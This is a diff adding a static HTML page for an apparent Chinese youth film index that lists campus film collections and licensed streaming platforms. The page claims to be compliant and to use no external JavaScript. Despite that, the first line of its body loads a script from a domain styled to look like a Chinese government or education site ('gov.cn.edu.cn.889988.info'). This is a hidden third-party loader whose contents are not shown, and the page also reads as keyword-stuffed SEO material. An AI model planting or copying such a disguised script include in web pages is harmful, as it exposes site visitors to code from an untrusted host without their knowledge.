@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="X-UA-Compatible" content="IE=edge">
+<title>青年影视：青年影像资料、校园片单与正版收看导航｜青年影视放映社</title>
+<meta name="description" content="青年影视整理青年影像资料、校园片单与正版收看导航，内容覆盖青春成长、校园纪录片、短片创作、适看建议与正版平台渠道。全站为静态单页资料站，不解析盗版播放源、不挂第三方资源、不提供网盘下载。移动端自适应，符合必应收录规范。根域 https://qingnianyingshi-top.github.io。">
+<meta name="keywords" content="青年影视, 青年影像资料, 校园片单, 青春成长影视, 短片创作导航, 正版收看渠道, qingnianyingshi">
+<meta name="author" content="青年影视放映社">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="msvalidate.01" content="QNYS20261016BING19">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;background:#f3ede0;color:#2c2a24;line-height:1.8;overflow-x:hidden}
+a{color:#2f6b4f;text-decoration:none;transition:.2s}
+a:hover{color:#c8762e}
+.wrap{width:min(1140px,100%);margin:0 auto;padding:0 20px}
+
+/* 社牌栏 */
+.board{background:#233126;border-bottom:4px solid #c8762e;padding:12px 0;position:relative}
+.board::after{content:"";position:absolute;bottom:-4px;left:0;width:100%;height:1px;background:#c8762e;opacity:.4}
+.board-in{width:min(1140px,100%);margin:0 auto;padding:0 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
+.club-no{font-size:11px;color:#a9c2b3;font-family:"Consolas",monospace;letter-spacing:1px}
+.club{font-size:18px;font-weight:900;color:#f3ede0;letter-spacing:3px}
+.club b{color:#e0b87a}
+.host{font-size:12px;color:#a9c2b3;font-family:"Consolas",monospace;word-break:break-all}
+.tag{font-size:10px;color:#233126;background:#e0b87a;padding:3px 10px;font-weight:700;letter-spacing:1px}
+
+/* Hero 放映海报 */
+.hero{background:linear-gradient(180deg,#e7dcc6 0%,#f3ede0 100%);border-bottom:1px solid #d8c9a8;padding:50px 0 40px;position:relative;overflow:hidden}
+.hero::before{content:"🎞";position:absolute;top:14px;right:5%;font-size:110px;opacity:.08;transform:rotate(-8deg)}
+.hero-in{width:min(1140px,100%);margin:0 auto;padding:0 20px;position:relative;z-index:1}
+.bulletin{display:inline-block;background:#c8762e;color:#fff;font-size:11px;letter-spacing:2px;padding:4px 14px;border-radius:2px;margin-bottom:14px}
+.hero h1{font-size:38px;font-weight:900;color:#233126;margin-bottom:10px;letter-spacing:2px}
+.hero h1 b{color:#2f6b4f;border-bottom:3px double #c8762e}
+.hero p{font-size:15px;color:#5a5343;max-width:660px;margin-bottom:18px}
+.note{background:#fbf7ec;border:1px solid #d8c9a8;border-left:3px solid #2f6b4f;padding:10px 14px;font-size:12.5px;color:#6b6353;margin-bottom:16px}
+.note b{color:#2f6b4f}
+.url-strip{display:inline-block;font-family:"Consolas",monospace;font-size:12px;color:#2f6b4f;background:#fbf7ec;border:1px dashed #c8762e;padding:8px 16px;word-break:break-all}
+.url-strip::before{content:"放映地址：";color:#c8762e}
+
+/* 导航 */
+.nav{background:#233126;border-bottom:1px solid #161f18;position:sticky;top:0;z-index:50}
+.nav-in{width:min(1140px,100%);margin:0 auto;padding:8px 20px;display:flex;gap:6px;flex-wrap:wrap}
+.nav-in a{font-size:13px;padding:7px 15px;background:#2c3a30;color:#a9c2b3;border:1px solid #161f18;border-radius:2px;font-weight:600}
+.nav-in a:hover{color:#233126;background:#e0b87a}
+
+/* 栏头 */
+.sec{margin-bottom:54px}
+.shead{display:flex;align-items:center;gap:10px;margin-bottom:20px;border-bottom:2px solid #c8762e;padding-bottom:6px}
+.shead .tk{width:10px;height:22px;background:#2f6b4f;border-radius:1px;transform:skewX(-10deg)}
+.shead h2{font-size:21px;font-weight:800;color:#233126}
+.shead h2 b{color:#2f6b4f}
+.shead .lb{font-size:10px;color:#8a7d63;margin-left:auto;font-family:"Consolas",monospace;border:1px solid #d8c9a8;padding:2px 8px}
+
+/* 海报卡 */
+.posters{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.poster{background:#fbf7ec;border:1px solid #d8c9a8;border-radius:3px;overflow:hidden;transition:.3s}
+.poster:hover{transform:translateY(-4px);box-shadow:0 8px 18px rgba(40,30,15,.14);border-color:#c8762e}
+.poster .top{height:64px;background:linear-gradient(135deg,#2f6b4f,#3c7d5e);position:relative;display:flex;align-items:flex-end;padding:8px 12px}
+.poster:nth-child(2) .top{background:linear-gradient(135deg,#c8762e,#d9903f)}
+.poster:nth-child(3) .top{background:linear-gradient(135deg,#233126,#3a4a3c)}
+.poster:nth-child(4) .top{background:linear-gradient(135deg,#5b6f3a,#7c8f4e)}
+.poster .top span{font-size:10px;color:#fff;font-family:"Consolas",monospace;background:rgba(0,0,0,.25);padding:2px 6px;border-radius:2px}
+.poster .body{padding:14px 16px}
+.poster h3{font-size:15px;color:#233126;margin-bottom:6px;font-weight:800}
+.poster p{font-size:12px;color:#5a5343;margin-bottom:10px}
+.poster .meta{display:flex;justify-content:space-between;font-size:11px;font-family:"Consolas",monospace;color:#8a7d63;border-top:1px dashed #d8c9a8;padding-top:6px}
+.poster .meta span{color:#2f6b4f}
+
+/* 排期 */
+.sched{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.row{background:#fbf7ec;border:1px solid #d8c9a8;border-left:3px solid #c8762e;padding:14px 16px;display:flex;gap:14px;align-items:flex-start}
+.row .time{font-size:11px;font-family:"Consolas",monospace;color:#c8762e;flex-shrink:0;padding-top:2px}
+.row h3{font-size:14px;color:#233126;margin-bottom:4px}
+.row p{font-size:12px;color:#5a5343}
+.row p b{color:#2f6b4f}
+
+/* 正版渠道表 */
+.tbl{width:100%;border-collapse:collapse;font-size:13px;background:#fbf7ec;border:1px solid #d8c9a8}
+.tbl th{background:#233126;color:#e0b87a;padding:12px 14px;text-align:left}
+.tbl td{padding:10px 14px;border-bottom:1px solid #e3d8c0;color:#2c2a24;vertical-align:top}
+.tbl tr:hover td{background:#efe6d2}
+.tbl td b{color:#2f6b4f}
+
+/* 档案 */
+.arch{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+.card{background:#fbf7ec;border:1px solid #d8c9a8;padding:20px}
+.card h3{font-size:15px;color:#233126;margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.card h3::before{content:"🎫";}
+.card p{font-size:12.5px;color:#5a5343;margin-bottom:6px;padding-left:16px;position:relative}
+.card p::before{content:"—";position:absolute;left:0;color:#c8762e}
+.root{font-family:"Consolas",monospace;font-size:12px;color:#2f6b4f;word-break:break-all;background:#efe6d2;border:1px solid #d8c9a8;padding:10px 14px;margin-top:10px}
+.root::before{content:"根域：";color:#c8762e}
+
+footer{margin-top:50px;background:#233126;color:#8fa394;padding:34px 20px 18px;border-top:3px solid #c8762e}
+.foot-in{width:min(1140px,100%);margin:0 auto;text-align:center}
+.fn{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-bottom:14px}
+.fn a{font-size:12px;padding:6px 14px;background:#2c3a30;color:#a9c2b3;border:1px solid #161f18;border-radius:2px}
+.fn a:hover{color:#233126;background:#e0b87a}
+.fc{font-size:11px;line-height:2;font-family:"Consolas",monospace}
+.fc a{color:#e0b87a}
+
+@media(max-width:980px){
+.posters{grid-template-columns:repeat(2,1fr)}
+.sched{grid-template-columns:1fr}
+.arch{grid-template-columns:1fr}
+}
+@media(max-width:600px){
+.hero h1{font-size:24px}
+.shead h2{font-size:18px}
+.posters{grid-template-columns:1fr}
+.tbl{font-size:12px}
+.tbl th,.tbl td{padding:8px 10px}
+.host{font-size:11px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="board">
+<div class="board-in">
+<div class="club-no">CLUB NO. YOUTH-FILM-19</div>
+<div class="club">青年影视 <b>放映社</b></div>
+<div class="host">qingnianyingshi-top.github.io</div>
+<div class="tag">资料站</div>
+</div>
+</div>
+
+<header class="hero">
+<div class="hero-in">
+<div class="bulletin">YOUTH SCREENING INDEX</div>
+<h1>青年影视</h1>
+<p>青年影视放映社整理青年影像资料、校园片单与正版收看导航。内容覆盖青春成长、校园纪录片、短片创作与适看建议；不解析盗版播放源、不挂第三方资源、不提供网盘下载。</p>
+<div class="note">
+<b>站点性质：</b>「青年影视」仅作青年影像资料与正版导航站使用；所有「观看」均指向正版平台官方页面。
+</div>
+<div class="url-strip">https://qingnianyingshi-top.github.io</div>
+</div>
+</header>
+
+<nav class="nav">
+<div class="nav-in">
+<a href="#posters">片单海报</a>
+<a href="#sched">放映排期</a>
+<a href="#tbl">正版渠道</a>
+<a href="#arch">社团档案</a>
+</nav>
+
+<main class="wrap">
+
+<section class="sec" id="posters">
+<div class="shead"><span class="tk"></span><h2>片单<b>海报</b></h2><div class="lb">POSTERS</div></div>
+<div class="posters">
+<div class="poster">
+<div class="top"><span>NO.01</span></div>
+<div class="body">
+<h3>青春成长厅</h3>
+<p>校园、友谊、家庭沟通类片单资料，附适看年龄与正版平台。</p>
+<div class="meta"><span>全龄+</span><span>青春</span></div>
+</div>
+</div>
+<div class="poster">
+<div class="top"><span>NO.02</span></div>
+<div class="body">
+<h3>纪录片放映</h3>
+<p>青年创业、自然、社会类纪录片条目，来源以正版平台为主。</p>
+<div class="meta"><span>全龄</span><span>纪录</span></div>
+</div>
+</div>
+<div class="poster">
+<div class="top"><span>NO.03</span></div>
+<div class="body">
+<h3>短片创作区</h3>
+<p>高校短片、正版创投作品导航，不收录低俗冲突内容。</p>
+<div class="meta"><span>12+</span><span>短片</span></div>
+</div>
+</div>
+<div class="poster">
+<div class="top"><span>NO.04</span></div>
+<div class="body">
+<h3>合家喜剧廊</h3>
+<p>低冲突合家喜剧片单，适合周末家庭筛选。</p>
+<div class="meta"><span>全龄</span><span>喜剧</span></div>
+</div>
+<div class="poster">
+<div class="top"><span>NO.05</span></div>
+<div class="body">
+<h3>动画国语厅</h3>
+<p>动画电影国语配音版资料，标注正版平台与免费场次。</p>
+<div class="meta"><span>6+</span><span>动画</span></div>
+</div>
+<div class="poster">
+<div class="top"><span>NO.06</span></div>
+<div class="body">
+<h3>职场新声</h3>
+<p>青年就业、实习、社会起步题材影视资料。</p>
+<div class="meta"><span>12+</span><span>职场</span></div>
+</div>
+<div class="poster">
+<div class="top"><span>NO.07</span></div>
+<div class="body">
+<h3>正版悬疑</h3>
+<p>仅列正版平台可看悬疑片，不解析第三方播放页。</p>
+<div class="meta"><span>12+</span><span>悬疑</span></div>
+</div>
+<div class="poster">
+<div class="top"><span>NO.08</span></div>
+<div class="body">
+<h3>影像周资料</h3>
+<p>青年影像展、短片周公开资料导航，正版渠道收看。</p>
+<div class="meta"><span>全龄</span><span>展映</span></div>
+</div>
+</div>
+</section>
+
+<section class="sec" id="sched">
+<div class="shead"><span class="tk"></span><h2>放映<b>排期</b></h2><div class="lb">SCHEDULE</div></div>
+<div class="sched">
+<div class="row"><div class="time">MON</div><div>
+<h3>校园片单</h3>
+<p>青春成长类正版片单更新，<b>附适看年龄</b></p>
+</div></div>
+<div class="row"><div class="time">WED</div><div>
+<h3>纪录片夜</h3>
+<p>自然/社会类纪录片正版渠道导航</p>
+</div></div>
+<div class="row"><div class="time">FRI</div><div>
+<h3>短片放映</h3>
+<p>高校短片、正版创投作品资料</p>
+</div></div>
+<div class="row"><div class="time">SUN</div><div>
+<h3>合家场</h3>
+<p>低冲突喜剧与动画国语场，家庭筛选</p>
+</div></div>
+</div>
+</section>
+
+<section class="sec" id="tbl">
+<div class="shead"><span class="tk"></span><h2>正版<b>渠道</b></h2><div class="lb">LEGIT ONLY</div></div>
+<table class="tbl">
+<thead>
+<tr><th>平台</th><th>内容类型</th><th>收看说明</th></tr>
+</thead>
+<tbody>
+<tr><td><b>央视频</b></td><td>央视影视、纪录片</td><td>官方免费、正版授权、无第三方源</td></tr>
+<tr><td><b>B站放映厅</b></td><td>动画、纪录片、短片</td><td>筛"免费"标签，部分需大会员</td></tr>
+<tr><td><b>1905电影网</b></td><td>经典老片、修复版</td><td>正版网页端可看，无广告</td></tr>
+<tr><td><b>学习强国</b></td><td>青年创业、纪录专题</td><td>官方免费，需注册</td></tr>
+<tr><td><b>腾讯视频/爱奇艺</b></td><td>正版影视库</td><td>免费专区可筛，会员另计</td></tr>
+<tr><td><b>咪咕视频</b></td><td>合家栏目、卫视剧</td><td>部分免费，正版平台</td></tr>
+</tbody>
+</table>
+</section>
+
+<section class="sec" id="arch">
+<div class="shead"><span class="tk"></span><h2>社团<b>档案</b></h2><div class="lb">ROOT</div></div>
+<div class="arch">
+<div class="card">
+<h3>必应收录规则</h3>
+<p>静态单页：CSS内嵌、UTF-8、viewport齐全</p>
+<p>msvalidate.01 = QNYS20261016BING19</p>
+<p>robots meta = index, follow</p>
+<p>不生成 robots.txt / sitemap.xml</p>
+<p>移动端自适应，无横向滚动</p>
+<p>内页统一用 # 占位</p>
+<p>标签闭合完整，无外部JS依赖</p>
+</div>
+<div class="card">
+<h3>放映社信息</h3>
+<p>名称：青年影视</p>
+<p>定位：青年影像资料、校园片单、正版收看导航</p>
+<p>部署：单页静态、移动端自适应</p>
+<p>合规：不解析盗版、不挂第三方源、不提供网盘</p>
+<div class="root">https://qingnianyingshi-top.github.io</div>
+</div>
+</div>
+</section>
+
+</main>
+
+<footer>
+<div class="foot-in">
+<nav class="fn">
+<a href="#posters">片单海报</a>
+<a href="#sched">放映排期</a>
+<a href="#tbl">正版渠道</a>
+<a href="#arch">社团档案</a>
+<a href="#">放映守则</a>
+</nav>
+<div class="fc">
+青年影视 关键词：青年影视｜根域：https://qingnianyingshi-top.github.io<br>
+© 2024 青年影视放映社 仅做青年影像资料与正版导航，不解析播放源、不提供盗版下载。<br>
+YOUTH FILM INDEX // STATIC
+</div>
+</div>
+</footer>
+
+</body>
+</html>
